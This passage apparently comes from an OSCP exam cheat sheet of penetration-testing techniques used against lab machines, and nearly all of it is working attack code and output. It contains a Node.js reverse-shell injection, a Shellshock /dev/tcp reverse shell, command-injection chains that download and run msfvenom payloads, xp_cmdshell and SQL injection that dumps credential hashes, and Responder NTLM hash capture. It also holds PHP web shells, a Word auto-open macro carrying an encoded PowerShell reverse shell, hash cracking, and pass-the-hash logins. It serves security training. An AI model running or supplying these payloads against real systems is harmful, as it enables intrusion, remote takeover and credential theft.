
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2ODUwNTc5MjR9.UgSoyjhtdOX00NmlbaJAuX8M3bjIMv3jXMFY_SnXpB8

Upgrade-Insecure-Requests: 1



full_name=Joshua&address=street+123&card=12345678897087696879&cvc=1234&date=1234&captcha=3`
````
![image](https://github.com/xsudoxx/OSCP/assets/127046919/2b8e361a-4a2a-43b1-a2fa-ed41b2c8a846)
````
This time add a ;
````
````
POST /checkout HTTP/1.1

Host: 192.168.214.250:5000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 90

Origin: http://192.168.214.250:5000

Connection: close

Referer: http://192.168.214.250:5000/checkout

Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2ODUwNTc5MjR9.UgSoyjhtdOX00NmlbaJAuX8M3bjIMv3jXMFY_SnXpB8

Upgrade-Insecure-Requests: 1



full_name=Joshua&address=street+123&card=12345678897087696879&cvc=1234&date=1234&captcha=3;
````

![image](https://github.com/xsudoxx/OSCP/assets/127046919/d9d57594-c10e-4755-b409-16d602a7f5f2)

````
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(80, "192.168.45.191", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
````
````
POST /checkout HTTP/1.1

Host: 192.168.214.250:5000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 90

Origin: http://192.168.214.250:5000

Connection: close

Referer: http://192.168.214.250:5000/checkout

Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2ODUwNTc5MjR9.UgSoyjhtdOX00NmlbaJAuX8M3bjIMv3jXMFY_SnXpB8

Upgrade-Insecure-Requests: 1



full_name=Joshua&address=street+123&card=12345678897087696879&cvc=1234&date=1234&captcha=3;(function(){

    var net = require("net"),

        cp = require("child_process"),

        sh = cp.spawn("sh", []);

    var client = new net.Socket();

    client.connect(80, "192.168.45.191", function(){

        client.pipe(sh.stdin);

        sh.stdout.pipe(client);

        sh.stderr.pipe(client);

    });

    return /a/; // Prevents the Node.js application from crashing

})();
````
````
nc -nlvp 80  
listening on [any] 80 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.214.250] 46956
id
uid=1000(observer) gid=1000(observer) groups=1000(observer)
````
### Shellshock
````
nikto -ask=no -h http://10.11.1.71:80 2>&1
OSVDB-112004: /cgi-bin/admin.cgi: Site appears vulnerable to the 'shellshock' vulnerability
````
````
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.119.183/9001 0>&1'" \
http://10.11.1.71:80/cgi-bin/admin.cgi
````
### local File Inclusion
````
http://10.11.1.35/section.php?page=/etc/passwd
````
<img src="https://user-images.githubusercontent.com/127046919/227787857-bc760175-c5fb-47ce-986b-d15b8f59e555.png" width="480" height="250" />

#### Enumeration
````
userE@demon:/var/www/internal/backend/index.php #this file lives 5 directories deep.
127.0.0.1:8000/backend/?view=../../../../../etc/passwd #So you have to add 5 ../ in order to read the files you want
````

### Remote File Inclusion
````
http://10.11.1.35/section.php?page=http://192.168.119.168:80/hacker.txt
````

<img src="https://user-images.githubusercontent.com/127046919/227788184-6f4fed8d-9c8e-4107-bf63-ff2cbfe9b751.png" width="480" height="250" />

### Command Injection
#### DNS Querying Service
##### windows
For background the DNS Querying Service is running nslookup and then querying the output. The way we figured this out was by inputing our own IP and getting back an error that is similar to one that nslookup would produce. With this in mind we can add the && character to append another command to the query:
````
&& whoami
````

<img src="https://user-images.githubusercontent.com/127046919/223560695-218399e2-2447-4b67-b93c-caee8e3ee3df.png" width="250" height="240" />

````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
python3 -m http.server 80
&& certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
nc -nlvp 80
&& cmd /c C:\\Windows\\temp\\shell.exe
````
#### snmp manager
##### linux
````
For background on this box we had a snmp manager on port 4080 using whatweb i confirmed this was linux based. Off all of this I was able to login as admin:admin just on guessing the weak creds. When I got in I looked for random files and got Manager router tab which featured a section to ping the connectivity of the routers managed.
````
````
10.1.1.95:4080/ping_router.php?cmd=192.168.0.1
````
````
10.1.1.95:4080/ping_router.php?cmd=$myip
tcpdump -i tun0 icmp
````
````
10.1.1.95:4080/ping_router.php?cmd=192.168.119.140; wget http://192.168.119.140:8000/test.html
python3 -m http.server 8000
tcpdump -i tun0 icmp
````
````
10.1.1.95:4080/ping_router.php?cmd=192.168.119.140; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.140",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
nc -nlvp 22
````

### SQL Injection
#### Reference page
````
https://github.com/swisskyrepo/PayloadsAllTheThings
````
#### Testing sqli in every input field
````
';#---
````
#### MSSQL login page injection
##### Reference page
````
https://www.tarlogic.com/blog/red-team-tales-0x01/
````
````
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-command-execution
````
##### Exploitation
````
';EXEC master.dbo.xp_cmdshell 'ping 192.168.119.184';--
';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://192.168.119.184:443/shell.exe C:\\Windows\temp\shell.exe';--
';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\shell.exe';--
````
#### SQL and php login page
##### vulnerable code

````
found a db.php file/directory. In this case fuzzed with ffuf, the example in our ffuf bruteforcing login pages will help on this
````

````
<?php

include 'dbconnection.php';
$userid = $_POST['userid'];
$password = $_POST['password'];
$sql =
"SELECT * FROM users WHERE username = '$userid' AND password = '$password'";
$result = mysqli_query($db, $sql) or die(mysqli_error($db));
$num = mysqli_fetch_array($result);
	
if($num > 0) {
	echo "Login Success";
}
else {
	echo "Wrong User id or password";
}
?>
````
##### php sql login by pass

````
admin' -- ' --
````
#### Research Repo MariaDB

<img src="https://user-images.githubusercontent.com/127046919/224163239-b67fbb66-e3b8-4ea4-8437-d0fe2839a166.png" width="250" height="240" />

````
Background information on sqli: scanning the network for different services that may be installed. A mariaDB was installed however the same logic can be used depending on what services are running on the network
````

````
admin ' OR 1=1 --
````

````
1' OR 1 = 1#
````
#### Oracle DB bypass login

````
admin ' OR 1=1 --
````
#### Oracle UNION DB dumping creds

````
https://web.archive.org/web/20220727065022/https://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html
````

````
' 
Something went wrong with the search: java.sql.SQLSyntaxErrorException: ORA-01756: quoted string not properly terminated 
' OR 1=1 -- #query
Blog entry from USERA with title The Great Escape from 2017
Blog entry from USERB with title I Love Crypto from 2016
Blog entry from USERC with title Man-in-the-middle from 2018
Blog entry from USERA with title To Paris and Back from 2019
Blog entry from Maria with title Software Development Lifecycle from 2018
Blog entry from Eric with title Accounting is Fun from 2019
' union select 1,2,3,4,5,6-- #query
java.sql.SQLSyntaxErrorException: ORA-00923: FROM keyword not found where expected
 ' union select 1,2,3,4,5,6 from dual-- #Adjust for more or less columns
java.sql.SQLSyntaxErrorException: ORA-01789: query block has incorrect number of result columns
 ' union select 1,2,3 from dual-- #adjusted columns
java.sql.SQLSyntaxErrorException: ORA-01790: expression must have same datatype as corresponding expression ORA-01790: expression must have same datatype as corresponding expression 
 ' union select null,null,null from dual-- #query
Blog entry from null with title null from 0
' union select user,null,null from dual-- #query
Blog entry from example_APP with title null from 0
' union select table_name,null,null from all_tables-- #query
Blog entry from example_ADMINS with title null from 0
Blog entry from example_CONTENT with title null from 0
Blog entry from example_USERS with title null from 0
' union select column_name,null,null from all_tab_columns where table_name='example_ADMINS'-- #query
Blog entry from ADMIN_ID with title null from 0
Blog entry from ADMIN_NAME with title null from 0
Blog entry from PASSWORD with title null from 0
' union select ADMIN_NAME||PASSWORD,null,null from example_ADMINS-- #query
Blog entry from admind82494f05d6917ba02f7aaa29689ccb444bb73f20380876cb05d1f37537b7892 with title null from 0
````

#### MSSQL Error DB dumping creds
##### Reference Sheet

````
https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
````

<img src="https://user-images.githubusercontent.com/127046919/228388326-934cba2a-2a41-42f2-981f-3c68cbaec7da.png" width="400" height="240" />

##### Example Case

````
' #Entered
Unclosed quotation mark after the character string '',')'. #response
````
###### Visualize the SQL statement being made

````
insert into dbo.tablename ('',''); 
#two statements Username and Email. Web Server says User added which indicates an insert statement
#we want to imagine what the query could potentially look like so we did a mock example above
insert into dbo.tablename (''',); #this would be created as an example of the error message above
````
##### Adjusting our initial Payload

````
insert into dbo.tablename ('1 AND 1=CONVERT(INT,@@version))--' ,''); #This is what is looks like
insert into dbo.tablename('',1 AND 1=CONVERT(INT,@@version))-- #Correct payload based on the above
',1 AND 1=CONVERT(INT,@@version))-- #Enumerate the DB
Server Error in '/Newsletter' Application.#Response
Incorrect syntax near the keyword 'AND'. #Response
',CONVERT(INT,@@version))-- #Corrected Payoad to adjust for the error
````
##### Enumerating DB Names

````
', CONVERT(INT,db_name(1)))--
master
', CONVERT(INT,db_name(2)))--
tempdb
', CONVERT(INT,db_name(3)))--
model
', CONVERT(INT,db_name(4)))--
msdb
', CONVERT(INT,db_name(5)))--
newsletter
', CONVERT(INT,db_name(6)))--
archive
````
##### Enumerating Table Names

````
', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top 1 TABLE_NAME FROM archive.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58))))--
pEXAMPLE
````
##### Enumerating number of Columns in selected Table

````
', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pEXAMPLE')+CHAR(58)+CHAR(58))))--
3 entries
````
##### Enumerate Column Names

````
', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 1 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pEXAMPLE' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
alogin

', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 2 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pEXAMPLE' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
id

', CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 3 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pEXAMPLE' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
psw
````
##### Enumerating Data in Columns

````
', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 1 psw FROM archive..pEXAMPLE ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
3c744b99b8623362b466efb7203fd182

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 2 psw FROM archive..pEXAMPLE ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
5b413fe170836079622f4131fe6efa2d

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 3 psw FROM archive..pEXAMPLE ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
7de6b6f0afadd89c3ed558da43930181

', CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 4 psw FROM archive..pEXAMPLE ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
cb2d5be3c78be06d47b697468ad3b33b
````
### llmnr-poisoning-responder
#### http
````
https://juggernaut-sec.com/llmnr-poisoning-responder/
````
````
responder -I tun0 -wv
````
![image](https://user-images.githubusercontent.com/127046919/233516797-36702551-f60a-4d0e-866a-7c3a8e2971c1.png)

````

[+] Listening for events...                                                                                                                                                                                                                 

[HTTP] Sending NTLM authentication request to 192.168.54.165
[HTTP] GET request from: ::ffff:192.168.54.165  URL: / 
[HTTP] NTLMv2 Client   : 192.168.54.165
[HTTP] NTLMv2 Username : HEIST\enox
[HTTP] NTLMv2 Hash     : enox::HEIST:4c153c5e0d81aee9:4F46F09B4B79350EA32DA7815D1F0779:01010000000000006E6BEC31EC73D90178BAF58029B083DD000000000200080039004F005500460001001E00570049004E002D00510042004A00560050004E004E0032004E0059004A000400140039004F00550046002E004C004F00430041004C0003003400570049004E002D00510042004A00560050004E004E0032004E0059004A002E0039004F00550046002E004C004F00430041004C000500140039004F00550046002E004C004F00430041004C000800300030000000000000000000000000300000C856F6898BEE6992D132CC256AC1C2292F725D1C9CB0A2BB6F2EA6DD672384220A001000000000000000000000000000000000000900240048005400540050002F003100390032002E003100360038002E00340039002E00350034000000000000000000
````
#### SMB
````
sudo responder -I tun0 -d -w
````
````
file://///<your $ip>/Share
````

![image](https://github.com/xsudoxx/OSCP/assets/127046919/a80cb512-fa68-4cf9-a8e1-565d70e52137)


![image](https://github.com/xsudoxx/OSCP/assets/127046919/2bb68b1f-70dc-4154-b961-3f42118b8495)


#### Cracking the hash
````
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
````
##### Hash
````
enox::HEIST:4c153c5e0d81aee9:4F46F09B4B79350EA32DA7815D1F0779:01010000000000006E6BEC31EC73D90178BAF58029B083DD000000000200080039004F005500460001001E00570049004E002D00510042004A00560050004E004E0032004E0059004A000400140039004F00550046002E004C004F00430041004C0003003400570049004E002D00510042004A00560050004E004E0032004E0059004A002E0039004F00550046002E004C004F00430041004C000500140039004F00550046002E004C004F00430041004C000800300030000000000000000000000000300000C856F6898BEE6992D132CC256AC1C2292F725D1C9CB0A2BB6F2EA6DD672384220A001000000000000000000000000000000000000900240048005400540050002F003100390032002E003100360038002E00340039002E00350034000000000000000000
````
### SSRF
SSRF vulnerabilities occur when an attacker has full or partial control of the request sent by the web application. A common example is when an attacker can control the third-party service URL to which the web application makes a request.

<img src="https://user-images.githubusercontent.com/127046919/224167289-d416f6b0-f256-4fd8-b7c2-bcdc3c474637.png" width="250" height="240" />

#### Example attack

````
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.146.172 - - [09/Mar/2023 16:39:17] code 404, message File not found
192.168.146.172 - - [09/Mar/2023 16:39:17] "GET /test.html HTTP/1.1" 404 -
````

````
http://192.168.119.146/test.html
http://192.168.119.146/test.hta
````

## Exploitation <img src="https://cdn-icons-png.flaticon.com/512/2147/2147286.png" width="40" height="40" />
### Windows rce techniques
````
cat shell.php                   
echo '<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>' > shell.php

http://<$Victim>/site/index.php?page=http://<Your $IP>:80/shell.php&cmd=ping <Your $IP>

tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
20:27:03.538792 IP 192.168.153.53 > 192.168.45.191: ICMP echo request, id 1, seq 1, length 40
20:27:03.539661 IP 192.168.45.191 > 192.168.153.53: ICMP echo reply, id 1, seq 1, length 40
````

````
locate nc.exe
impacket-smbserver -smb2support Share .
nc -nlvp 80
cmd.exe /c //<your kali IP>/Share/nc.exe -e cmd.exe <your kali IP> 80
````

````
cp /usr/share/webshells/asp/cmd-asp-5.1.asp . #IIS 5
ftp> put cmd-asp-5.1.asp
````

````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
python3 -m http.server 80
certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
cmd /c C:\\Windows\\temp\\shell.exe
C:\inetpub\wwwroot\shell.exe #Path to run in cmd.aspx, click Run
````

````
cp /usr/share/webshells/aspx/cmdasp.aspx .
cp /usr/share/windows-binaries/nc.exe .
ftp> put cmdasp.aspx
impacket-smbserver -smb2support Share .
http://<target $IP>:<port>/cmdasp.aspx
nc -nlvp <port on your kali>
cmd.exe /c //192.168.119.167/Share/nc.exe -e cmd.exe <your kali $IP> <your nc port>
````

### HTA Attack in Action
We will use msfvenom to turn our basic HTML Application into an attack, relying on the hta-psh output format to create an HTA payload based on PowerShell. In Listing 11, the complete reverse shell payload is generated and saved into the file evil.hta.
````
msfvenom -p windows/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil.hta
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your tun0 IP> LPORT=<your nc port> -f hta-psh -o ~/evil64.hta
````
### Exploiting Microsoft Office
When leveraging client-side vulnerabilities, it is important to use applications that are trusted by the victim in their everyday line of work. Unlike potentially suspicious-looking web links, Microsoft Office1 client-side attacks are often successful because it is difficult to differentiate malicious content from benign. In this section, we will explore various client-side attack vectors that leverage Microsoft Office applications
#### MSFVENOM
````
msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f hta-psh -o shell.doc
````
#### Minitrue
````
https://github.com/X0RW3LL/Minitrue
cd /opt/WindowsMacros/Minitrue
./minitrue
select a payload: windows/x64/shell_reverse_tcp
select the payload type: VBA Macro
LHOST=$yourIP
LPORT=$yourPort
Payload encoder: None
Select or enter file name (without extensions): hacker
````
#### Microsoft Word Macro
The Microsoft Word macro may be one the oldest and best-known client-side software attack vectors.

Microsoft Office applications like Word and Excel allow users to embed macros, a series of commands and instructions that are grouped together to accomplish a task programmatically. Organizations often use macros to manage dynamic content and link documents with external content. More interestingly, macros can be written from scratch in Visual Basic for Applications (VBA), which is a fully functional scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.
````
Create the .doc file 
````
````
Use the base64 powershell code from revshells.com
````
````
Used this code to inline macro(Paste the code from revshells in str variable) :

str = "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQA3ADQAIgAsADkAOQA5ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

n = 50

for i in range(0, len(str), n):
    print "Str = Str + " + '"' + str[i:i+n] + '"'
````
````
Sub AutoOpen()

  MyMacro

End Sub

Sub Document_Open()

  MyMacro

End Sub

Sub MyMacro()

    Dim Str As String

   <b>Paste the script output here!<b>

    CreateObject("Wscript.Shell").Run Str

End Sub
````
### Coding RCEs

#### Python
````
import subprocess

# Replace "<your $IP" and "<your $PORT>" with your target IP address and port
reverse_shell_command = 'python -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<your $IP>',<your $PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')"'

try:
    # Execute the reverse shell command
    subprocess.run(reverse_shell_command, shell=True)
except Exception as e:
    print(f"An error occurred: {e}")
````
#### Bash

````
#!/bin/bash

sh -i 5<> /dev/tcp/[MY_IP]/[MY_PORT] 0<&5 1>&5 2>&5
````

### Linux rce techniques
````
cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.php
python3 -m http.server
nc -nlvp 443
<?php system("wget http://<kali IP>/shell.php -O /tmp/shell.php;php /tmp/shell.php");?>
````
````
echo '<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>' > shell.php
shell.php&cmd=
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your $IP",22));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
nc -nlvp 22
or

busybox nc $IP 5000 -e /bin/bash
````
````
 &cmd=whoami or ?cmd=whoami
<?php shell_exec($_GET["cmd"]);?>
<?php system($_GET["cmd"]);?>
<?php echo passthru($_GET['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
<?php system($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
````
````
cp /usr/share/webshells/php/php-reverse-shell.php .
python3 -m http.server 800
nc -nlvp 443
&cmd=wget http://192.168.119.168:800/php-reverse-shell.php -O /tmp/shell.php;php /tmp/shell.php
````
#### Reverse Shell Payload
````
https://revshells.com/
````
### Hashing & Cracking
#### Wordlists that worked
````
/usr/share/wordlists/rockyou.txt
/usr/share/wfuzz/wordlist/others/common_pass.txt
````
#### Enumeration
````
hashid <paste your hash here>
````
````
https://www.onlinehashcrack.com/hash-identification.php
````
````
https://hashcat.net/wiki/doku.php?id=example_hashes
````
#### Cracking hashes
````
https://crackstation.net/
````
````
hashcat -m <load the hash mode> hash.txt /usr/share/wordlists/rockyou.txt
````
##### Md5
````
hashcat -m 0 -a 0 -o hashout eric.hash /home/jerm/rockyou.txt #if the original doesnt work use this
````
##### Cracking with Johntheripper
````
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
````
##### Crakcing with hydra
###### ssh
````
hydra -l userc -P /usr/share/wfuzz/wordlist/others/common_pass.txt $IP -t 4 ssh
hydra -l userc -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh
````
#### Cracking kdbx files
````
keepass2john Database.kdbx > key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
````
#### KeePass.dmp
````
sudo git clone https://github.com/CMEPW/keepass-dump-masterkey
chmod +x poc.py

python3 poc.py -d /home/kali/HTB/Keeper/lnorgaard/KeePassDumpFull.dmp 
2023-09-27 20:32:29,743 [.] [main] Opened /home/kali/HTB/Keeper/lnorgaard/KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
````
#### Downloading keepassxc
````
sudo apt update && sudo apt-get install keepassxc
````

![image](https://github.com/xsudoxx/OSCP/assets/127046919/7aa67384-ba6b-4a94-b522-99349a987e3d)

![image](https://github.com/xsudoxx/OSCP/assets/127046919/1b97a744-63ab-4264-b3b3-e32485edfceb)


#### Cracking Zip files
````
unzip <file>
unzip bank-account.zip 
Archive:  bank-account.zip
[bank-account.zip] bank-account.xls password: 
````
````
zip2john file.zip > test.hash
john --wordlist=/usr/share/wordlists/rockyou.txt test.hash
````
#### Cracking with CyberChef
````
https://gchq.github.io/CyberChef/
````
##### hashcat output
If hashcat gives back some sort of Hex Encoding you can use cyber chef to finish off the hash and give you back the password
````
$HEX[7261626269743a29]
````
![image](https://github.com/xsudoxx/OSCP/assets/127046919/88bc13a2-ec53-4a91-8ce1-c484fde12886)

#### Testing for passwords
##### Background
````
We typically know we can unzip files and get de-compress the results, in this case we unzipped the zip file and got almost nothing back it was weird, we used instead the commands below to test for a password on the zip file and it did indeed prompt us to enter a zip file password, we used our cracking technique of hashes above was able to login with su chloe with the password we found in the file
````
````
sudo 7z x sitebackup3.zip
````
````
7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs AMD Ryzen 5 5500U with Radeon Graphics          (860F81),ASM,AES-NI)

Scanning the drive for archives:
1 file, 25312 bytes (25 KiB)

Extracting archive: sitebackup3.zip
--
Path = sitebackup3.zip
Type = zip
Physical Size = 25312

    
Enter password (will not be echoed):
Everything is Ok         

Folders: 17
Files: 19
Size:       67063
Compressed: 25312
````
### Logging in/Changing users
#### rdp
````
rdesktop -u 'USERN' -p 'abc123//' 192.168.129.59 -g 94% -d example
xfreerdp /v:10.1.1.89 /u:USERX /pth:5e22b03be22022754bf0975251e1e7ac
````
## Buffer Overflow <img src="https://w7.pngwing.com/pngs/331/576/png-transparent-computer-icons-stack-overflow-encapsulated-postscript-stacking-angle-text-stack-thumbnail.png" width="40" height="40" />

## MSFVENOM
### MSFVENOM Cheatsheet
````
https://github.com/frizb/MSF-Venom-Cheatsheet
````
### Linux 64 bit PHP
````
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f elf > shell.php
````
### Windows 64 bit
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=<port you designated> -f exe -o ~/shell.exe
````
### Windows 64 bit apache tomcat
````
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=80 -f raw > shell.jsp
````
### Windows 64 bit aspx
````
msfvenom -f aspx -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -o shell64.aspx
````
### Apache Tomcat War file
````
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.179 LPORT=8080 -f war > shell.war
````
### Javascript shellcode
````
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.179 LPORT=443 -f js_le -o shellcode
````
## File Transfer <img src="https://cdn-icons-png.flaticon.com/512/1037/1037316.png" width="40" height="40" />
### Powershell Linux to Windows
````
(new-object System.Net.WebClient).DownloadFile('http://192.168.119.138:800/chisel.exe','C:\Windows\Tasks\chisel.exe')
````
### SMB Linux to Windows
````
impacket-smbserver -smb2support Share .
cmd.exe /c //<your kali IP>/Share/<file name you want>
````
````
/usr/local/bin/smbserver.py -username df -password df share . -smb2support
net use \\<your kali IP>\share /u:df df
copy \\<your kali IP>\share\<file wanted>
````
````
impacket-smbserver -smb2support Share .
net use \\<your kali IP>\share
copy \\<your kali IP>\share\whoami.exe
````
### Windows http server Linux to Windows
````
python3 -m http.server 80
certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
````
````
Invoke-WebRequest -Uri http://10.10.93.141:7781/winPEASx64.exe -OutFile wp.exe
````
#### Errors
````
Access is denied. In this case try Invoke-WebRequest for powershell
````
### SMB Shares Windows to Windows
````
In this situation we have logged onto computer A
sudo impacket-psexec Admin:'password123'@192.168.203.141 cmd.exe
C:\Windows\system32> ipconfig
 
Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.203.141
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.203.254

